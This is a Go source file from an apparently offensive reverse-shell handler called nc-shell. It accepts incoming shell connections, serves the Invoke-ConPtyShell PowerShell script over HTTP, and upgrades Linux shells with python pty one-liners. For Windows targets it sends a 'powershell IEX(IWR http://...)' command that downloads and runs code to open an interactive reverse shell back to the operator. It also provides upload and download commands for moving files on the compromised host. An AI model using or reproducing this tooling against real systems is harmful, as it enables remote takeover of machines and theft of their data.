package terminal

import (
	"bytes"
	"fmt"
	"io"
	"log"
	utils "nc-shell/src/utils"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	rice "github.com/GeertJohan/go.rice"
	"golang.org/x/net/netutil"
)

func listenAndAcceptConnection(terminal *Terminal) error {
	var err error
	localPort := ":" + strconv.Itoa(terminal.Options.Port)
	terminal.Listener, err = net.Listen("tcp", localPort)
	if err != nil {
		terminal.Log.Error(err)
		return err
	}
	terminal.Log.Debug("Listening on " + localPort + " and waiting for connection")
	return terminal.accept()

}
func (terminal *Terminal) accept() error {
	var err error
	//for {
	terminal.Con, err = terminal.Listener.Accept()
	if err != nil {
		// This error is generated when the listener is closed with command Stop
		if !strings.Contains(err.Error(), "use of closed network connection") {
			terminal.Log.Error(err)
		} else {
			localPort := ":" + strconv.Itoa(terminal.Options.Port)
			terminal.Log.Notice("The listener " + localPort + " has been stopped")
		}
		return err
	}
	terminal.Log.Notice("Connect from", terminal.Con.RemoteAddr())
	// Close the listener once the client is accepted
	terminal.Listener.Close()

	return nil

}

func (terminal *Terminal) serveHTTPRevShellPowershell() error {
	var localAddr string
	var err error
	scriptServed := false
	// If the option OnlyWebserver is set terminal.Con will be nil
	if terminal.Con != nil {
		localAddr = terminal.Con.LocalAddr().String()
	} else {
		localAddr = ":" + strconv.Itoa(terminal.Options.Port)
	}
	terminal.Listener, err = net.Listen("tcp", localAddr)
	if err != nil {
		terminal.Log.Fatal("Error listening on " + localAddr)
	}
	defer terminal.Listener.Close()
	var svc = http.Server{
		Handler: http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
			templateBox, err := rice.FindBox("../static/")
			if err != nil {
				terminal.Log.Fatal(err)
			}
			// get file contents as string
			file, err := templateBox.Open("Invoke-ConPtyShell.ps1")
			if err != nil {
				terminal.Log.Fatal(err)
			}
			//rice.MustFindBox("./static/Invoke-ConPtyShell.ps1").HTTPBox()
			http.ServeContent(rw, r, "Invoke-ConPtyShell.ps1", time.Now(), file)
			terminal.Log.Debug("Invoke-ConPtyShell.ps1 have been served")
			//http.ServeFile(rw, r, ./static/Invoke-ConPtyShell.ps1)

			scriptServed = true
			terminal.Listener.Close()

		}),
	}
	terminal.Listener = netutil.LimitListener(terminal.Listener, int(1))
	err = svc.Serve(terminal.Listener)
	// If there is an error and the script haven't been served
	if err != nil && !scriptServed {
		if strings.Contains(err.Error(), "use of closed network connection") {
			localPort := ":" + strconv.Itoa(terminal.Options.Port)
			terminal.Log.Notice("The listener " + localPort + " has been stopped")
		} else {
			terminal.Log.Error("Error when serving HTTP connection " + err.Error())
		}
	} else {
		//Ignore the error as the script as been delivered
		err = nil
	}
	return err

}

func (terminal *Terminal) setSpawnTTY() {
	terminal.getTerminalSize()
	sttySize := "stty rows " + terminal.rows + " cols " + terminal.cols
	terminal.spawnTTY = `/usr/bin/env python2.7 -c 'import pty; pty.spawn(["/bin/bash","-c"," ` + sttySize + `  ;bash"])'
/usr/bin/env python -c 'import pty; pty.spawn(["/bin/bash","-c"," ` + sttySize + `  ;bash"])'
/usr/bin/env python3 -c 'import pty; pty.spawn(["/bin/bash","-c"," ` + sttySize + `  ;bash"])'
`
}

func (terminal *Terminal) getTerminalSize() {
	cmd := exec.Command("stty", "size")
	cmd.Stdin = os.Stdin
	sizeByte, err := cmd.Output()
	size := string(sizeByte)
	size = strings.TrimSuffix(size, "\n")
	if err != nil {
		log.Fatal(err)
	}
	terminal.rows = strings.Split(size, " ")[0]
	terminal.cols = strings.Split(size, " ")[1]

}

//Mettre dans utils network
func (terminal *Terminal) sendStringToStream(str string) []byte {
	terminal.Log.Debug("Send string : " + str + " to stream")
	buf := []byte(str)
	bufRead := make([]byte, 10240)
	_, err := terminal.Con.Write(buf)

	if err != nil {
		terminal.Log.Fatal("Write error: %s\n", err)
	}
	// Wait to catch the noisy output
	time.Sleep(500 * time.Millisecond)
	// Force to stop to read. Useful for windows reverse connection with ConPTY
	terminal.Con.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	terminal.Con.Read(bufRead)
	fmt.Println(string(bufRead))
	// Send new line to show the prompt
	terminal.Con.Write([]byte("\n"))
	// Disable timeout for further read
	terminal.Con.SetReadDeadline(time.Time{})
	return bufRead
}

// Performs copy operation between streams: os and tcp streams
func (terminal *Terminal) streamCopy(src io.Reader, dst io.Writer, toRemote bool) <-chan int {
	syncChannel := make(chan int)
	var command string
	go func() {
		defer func() {
			if con, ok := dst.(net.Conn); ok {
				if command != "background" {
					con.Close()
					terminal.Log.Debugf("Connection from %v is closed\n", con.RemoteAddr())
					syncChannel <- 0 // Notify that processing is finished

				} else {
					syncChannel <- 1 // Notify that processing is backgrounded
				}
			}

		}()
		for {
			var nBytes int
			var err error
			buf := make([]byte, 1024)
			nBytes, err = src.Read(buf)
			if err != nil {
				if err != io.EOF {
					terminal.Log.Criticalf("Read error: %s\n", err)

				}
				break
			}
			//if writing stdin -> target
			if toRemote {
				// Remove null byte and line feed (\x10) which was send sometimes between each character
				command += string(bytes.Trim(bytes.Trim(buf, string(utils.Nullbyte)), string(utils.Newline)))
				//Contains new line
				if utils.SliceByteContains(buf, byte(13)) {
					terminal.mutex.Lock()
					command = strings.TrimSpace(command)
					terminal.Log.Debug("Command contains new line: " + command)
					firstKeyWord := strings.Split(command, " ")[0]
					commandSplit := strings.Split(command, " ")
					switch firstKeyWord {
					case "upload":
						terminal.Log.Debug("Custom command upload")
						//fmt.Println("upload")
						terminal.Upload(command)
						//skip the command
						nBytes = 0

					case "download":
						terminal.Log.Debug("Custom command download")
						terminal.Download(commandSplit[1])
						//skip the command
						nBytes = 0
						dst.Write(bytes.Repeat(utils.Backspace, len(command)))

					case "background":
						terminal.Log.Debug("Custom command background")
						//skip the command
						terminal.mutex.Unlock()
						nBytes = 0
						dst.Write(bytes.Repeat(utils.Backspace, len(command)))
						return

					case "EXIT":
						terminal.Log.Debug("Custom command EXIT")
						terminal.mutex.Unlock()
						return

					}
					terminal.mutex.Unlock()
					command = ""
				}
			}

			// If write target -> stdout
			if !toRemote {
				// Using mutex to avoid writing stdout of the target while we are typing
				terminal.mutex.Lock()
				_, err = dst.Write(buf[0:nBytes])
				terminal.mutex.Unlock()
			} else {
				_, err = dst.Write(buf[0:nBytes])
			}
			if err != nil {
				terminal.Log.Critical("Write error: %s\n", err)
				return

			}

		}

	}()
	return syncChannel
}

func (terminal *Terminal) execute(cmd string) []byte {

	terminal.Log.Debug("Execute command: " + cmd)
	bufRead := make([]byte, 10240)
	_, err := terminal.Con.Write([]byte(cmd + "\n"))
	if err != nil {
		terminal.Log.Fatalf("Write error: %s\n", err)
	}
	// Wait to catch the noisy output
	time.Sleep(500 * time.Millisecond)
	// Force to stop to read. Useful for windows reverse connection with ConPTY
	terminal.Con.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	// Catch it to not hide it
	terminal.Con.Read(bufRead)
	terminal.Log.Debug("Output of the command: " + string(bufRead))
	// Send new line to show the prompt
	terminal.Con.Write([]byte("\n"))

	// Disable timeout for further read
	terminal.Con.SetReadDeadline(time.Time{})
	return bufRead
}

func (terminal *Terminal) cleanCmd(cmd string) {
	//Remove all the character which has been sent (for example if someone send upload xxxxx we don't want to execute this command on the remote terminal). All the bytes are sent when they are press on the keyboard (we need this for using tab and arrow up key)
	terminal.execute(string(bytes.Repeat(utils.Backspace, len(cmd))))
	terminal.execute(string(utils.Newline))
}

func (terminal *Terminal) sttyRawEcho(state string) {
	if state == "enable" {
		// Terminal in raw mode
		terminal.Log.Debug("Execute stty raw -echo")
		rawMode := exec.Command("/bin/stty", "raw", "-echo")
		rawMode.Stdin = os.Stdin
		_ = rawMode.Run()
		rawMode.Wait()

	} else if state == "disable" {
		// Terminal in cooked mode
		terminal.Log.Debug("Execute stty raw")
		rawModeOff := exec.Command("/bin/stty", "-raw", "echo")
		rawModeOff.Stdin = os.Stdin
		_ = rawModeOff.Run()
		rawModeOff.Wait()

	}
}

func (terminal *Terminal) interactiveReverseShellLinux() {
	//terminal.send_string_to_stream(terminal.spawnTTY)
	terminal.execute(terminal.spawnTTY)

}

func (terminal *Terminal) interactiveReverseShellWindows() {
	terminal.getTerminalSize()
	command := `powershell IEX(IWR http://` + terminal.Con.LocalAddr().String() + ` -UseBasicParsing); Invoke-ConPtyShell ` + strings.Split(terminal.Con.LocalAddr().String(), ":")[0] + " " + strings.Split(terminal.Con.LocalAddr().String(), ":")[1] + " -Rows " + terminal.rows + " -Cols " + terminal.cols
	terminal.Log.Debug("Send the command: " + command)
	terminal.execute(command)
	terminal.Con.Close()
}
